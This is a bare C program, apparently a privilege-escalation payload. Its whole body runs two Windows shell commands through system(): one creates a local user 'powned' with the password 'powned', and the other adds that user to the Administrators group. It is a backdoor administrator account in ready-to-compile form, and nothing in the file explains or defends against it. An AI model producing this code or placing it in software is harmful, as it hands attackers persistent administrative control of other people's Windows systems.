#include <stdio.h>
#include <string.h>

int main ()
{

   system("net user powned powned /add");
   system("net localgroup Administrators powned /add");

   return(0);
} 